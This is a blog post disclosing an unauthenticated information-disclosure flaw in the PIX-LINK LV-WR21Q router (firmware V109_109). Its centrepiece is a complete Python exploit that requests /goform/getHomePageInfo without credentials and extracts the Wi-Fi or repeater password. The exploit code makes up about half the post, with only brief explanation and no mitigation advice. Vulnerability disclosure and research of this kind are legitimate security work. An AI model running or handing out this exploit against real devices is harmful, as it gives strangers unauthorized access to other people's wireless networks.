---
layout: single
title: Unauthenticated Information Disclosure on PIX-LINK LV-WR21Q ("CVE requested")
excerpt: "I found a way to get the password of the wifi router when it's in normal mode or repeater mode without authenticating on the router gateway"
date: 2024-05-08
classes: wide
header:
  teaser: /assets/images/pix_link_cve/PIX-LINK.png
  teaser_home_page: true
  icon: #/assets/images/hackthebox.webp
categories:
  - CVE
tags:
  - Routers
  
---
Vulnerability Information:
- Product: PIX-LINK
- Model: LV-WR21Q
- Firmware Version: V109_109
- Vulnerability: Unauthenticated Information Disclosure
- Impact: <strong>Unauthorized Access to Wifi</strong>.
- Author: Red Team - Miguel Alves (@0xmupa), Fabrício Oliveira (xf5), Sérgio Charruadas

Hello friend, today I'm showing you an Information Disclosure fault in a PIX-LINK router.

First of all, you need to know that this fault will only be executed if you have cable access to the router or if the router Gateway is connected to the Internet.

Ps: It also works via wifi but what's the point of knowing the wifi password when you're already connected to it? hehehe.

<strong>Firmware Version:</strong>

![](/assets/images/pix_link_cve/firmware_version.png)

PoC:

1. Configure a router for ap (wifi) or repeater mode in the router gateway.
2. Run The Python Exploit below with the parameter wifi_password for AP configuration or repeater_password for Repeater configuration.
3. You'll have a password.

```
import requests
import sys

def make_request(host, endpoint):
    endpoints = {
        "wifi_password": "wifiBasicCfg",
        "repeater_password": "wifiRelay"
    }

    if endpoint not in endpoints:
        print("Usage: python3 pixlin_info_disclouse.py <host> <wifi_password/repeater_password>")
        return

    url = f"http://{host}/goform/getHomePageInfo?modules={endpoints[endpoint]}"

    try:
        response = requests.get(url)
        response.raise_for_status()
        
        print("Response:\n")
        print(response.text)
        
        password_key = 'wifiPwd' if endpoint == 'wifi_password' else 'wifiRelayPwd'
        password = response.json()[endpoints[endpoint]][password_key]
        print(f"\nPassword: {password}")
    except requests.exceptions.RequestException as e:
        print("Request failed:", e)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 pixlin_info_disclouse.py <host> <wifi_password/repeater_password>")
        return

    host, endpoint = sys.argv[1], sys.argv[2]
    make_request(host, endpoint)

if __name__ == "__main__":
    main()
```

The exploit is very simple, in a nutshell, it will look for the Host/IP and what information we want to access from the shell parameter, then it will look for the endpoint of the API that is destined to return that information and it will give us the answer.

Check the [POC Video](https://youtu.be/EcXSO12Oe0Q).


<strong>I wanted to save the world.</strong>

- Elliot Alderson

